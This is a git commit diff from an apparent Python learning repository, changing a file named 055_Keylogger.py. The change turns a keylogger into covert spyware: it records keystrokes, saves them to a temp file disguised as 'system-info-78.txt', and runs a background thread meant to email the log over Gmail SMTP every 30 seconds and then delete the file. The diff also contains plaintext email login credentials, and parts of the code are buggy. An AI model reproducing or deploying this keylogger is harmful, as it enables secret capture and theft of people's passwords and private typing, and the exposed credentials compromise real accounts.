8abd0cc063c5f4ccb503f96947ee66fca9381d18
mehmet yel <mehmetyasinyel@hotmail.com>
2021-05-12 15:46:01 +0300

    python_learn30

--- projes/055_Keylogger.py
+++ projes/055_Keylogger.py
@@ -4,6 +4,7 @@ from email.mime.text import MIMEText
 import smtplib
 import os
 import time
+import threading
 
 liste=list()
 capsdurum=False
@@ -13,117 +14,140 @@ shftliste=["=","!","'","^","+","%","&","/","(",")"]
 gr_liste=["}",">","£","#","$","½","<","{","[","]"]
 rakam="0123456789"
 
-def bas(key):
-    global liste,capsdurum,shftdurum,gr_durum
+def main():
 
-    try:
-        if shftdurum:
-            if key.char in rakam:
-                liste.append(shftliste(int(key.char)))
-            else:
-                if key.char=="*":
-                    liste.append("?")
-                elif key.char=="-":
-                    liste.append("_")
+    def bas(key):
+        global liste,capsdurum,shftdurum,gr_durum
+
+        try:
+            if shftdurum:
+                if key.char in rakam:
+                    liste.append(shftliste(int(key.char)))
                 else:
-                    if capsdurum:
-                        liste.append(key.char.upper())
+                    if key.char=="*":
+                        liste.append("?")
+                    elif key.char=="-":
+                        liste.append("_")
                     else:
-                        liste.append(key.char)                
+                        if capsdurum:
+                            liste.append(key.char.upper())
+                        else:
+                            liste.append(key.char)                
 
-        elif gr_durum:
-            if key.char in rakam:
-                liste.append(gr_liste(int(key.char)))
+            elif gr_durum:
+                if key.char in rakam:
+                    liste.append(gr_liste(int(key.char)))
+
+                else:
+                    if key.char=="*":
+                        liste.append("\\")
+                    elif key.char=="-":
+                        liste.append("|")
+                    elif key.char=="q":
+                        liste.append("@")
+
+            elif capsdurum:
+                liste.append(key.char.upper())
 
             else:
-                if key.char=="*":
-                    liste.append("\\")
-                elif key.char=="-":
-                    liste.append("|")
-
-        elif capsdurum:
-            liste.append(key.char.upper())
-
-        else:
-            liste.append(key.char)       
+                liste.append(key.char)       
 
                  
         
-    except:
-        if key==Key.space:
-            liste.append(" ")
+        except:
+            if key==Key.space:
+                liste.append(" ")
 
-        if key==Key.enter:
-            liste.append("\n")
+            if key==Key.enter:
+                liste.append("\n")
 
-        if key==Key.backspace:
-            liste.append("'<'")
+            if key==Key.backspace:
+                liste.append("'<'")
 
-        if key==Key.caps_lock:
-            if capsdurum:
-                capsdurum=False
+            if key==Key.caps_lock:
+                if capsdurum:
+                    capsdurum=False
 
-            else:
-                capsdurum=True
+                else:
+                    capsdurum=True
+
+            if key==Key.alt_gr:
+                grgr_durum= True
+
+
+
+        if len(liste)>=30:
+            dosya_yaz()
+            liste=list()
+
+        if key==Key.shift_l or key==Key.shift_r:
+            shftdurum=True
+
+    def birak(key):
+
+        global shftdurum
+
+        if key==Key.shift_l or key==Key.shift_r:
+            shftdurum=False
 
         if key==Key.alt_gr:
-            grgr_durum= True
+            gr_durum=False
 
 
+    def dosya_yaz():
+        global liste
 
-    if len(liste)>=30:
-        dosya_yaz()
-        liste=list()
+        username=os.getlogin()
 
-    if key==Key.shift_l or key==Key.shift_r:
-        shftdurum=True
+        with open("C:/Users/"+username+"/Appdata/Local/Temp/system-info-78.txt","a", encoding="utf8") as dosya:
+            for x in liste:
+                dosya.write(x)
 
-def birak(key):
+                    
+    with Listener(on_press=bas, on_release=birak) as dinleyici: 
+        dinleyici.join()
 
-    global shftdurum
-
-    if key==Key.shift_l or key==Key.shift_r:
-        shftdurum=False
-
-    if key==Key.alt_gr:
-        gr_durum=False
-
-
-def dosya_yaz():
-    global liste
-
-    with open("C:/Users/Casper/Desktop/KEY.txt","a", encoding="utf8") as dosya:
-        for x in liste:
-            dosya.write(x)
 
 def mail_gonder():
 
-    konum="C:/Users/Casper/Desktop/KEY.txt"
+    while 1:
+        time.sleep(30)
+        
+        username=os.getlogin()
 
-    if os.path.getsize(konum)>=500:
+        konum="C:/Users/"+username+"/Appdata/Local/Temp/system-info-78.txt"
 
-        with open(konum,"r",encoding="utf-8") as dosya:
 
-            icerik=file.read()
+    try:
+        if os.path.getsize(konum)>=50:
+    
+            with open(konum,"r",encoding="utf-8") as dosya:
+    
+                icerik=dosya.read()
+    
+            yapi=MIMEMultipart()
+            yapi["From"]="mehmetyasinyeles@gmail.com"
+            yapi["To"]="mehmetyasinyeles@gmail.com"
+            yapi["Subject"]="Log"
+    
+            yazi=MIMEText(icerik,"plain")
+    
+            yapi.attach(yazi)
+    
+            server=smtplib.SMTP("smtp.gmail.com",587)
+            server.ehlo()
+            server.starttls()
+            server.login("mehmetyasinyeles@gmail.com","evxpyj11")
+            server.sendmail("mehmetyasinyeles@gmail.com","mehmetyasinyeles@gmail.com",yapi.as_string())
+            server.close()
+    
+            os.remove(konum)
+    except:
+        pass
 
-        yapi=MIMEMultipart()
-        yapi["From"]="b192102009@subu.edu.tr"
-        yapi["To"]="b192102009@subu.edu.tr"
-        yapi["Subject"]="Log"
 
-        yazi=MIMEText(icerik,"plain")
+t1=threading.Thread(target=main)       
+t2=threading.Thread(target=mail_gonder)
 
-        yapi.attach(yazi)
-
-        server.smtplib.SMTP("smtp.gmail.com",587)
-        server.ehlo()
-        server.starttls()
-        server.login("b192102009@subu.edu.tr","26923297662")
-        server.sendmail("b192102009@subu.edu.tr","b192102009@subu.edu.tr",yapi.as_string)
-        server.close()
-
-                    
-with Listener(on_press=bas, on_release=birak) as dinleyici: 
-    dinleyici.join()
-
-   
+t1.start()
+t2.start()
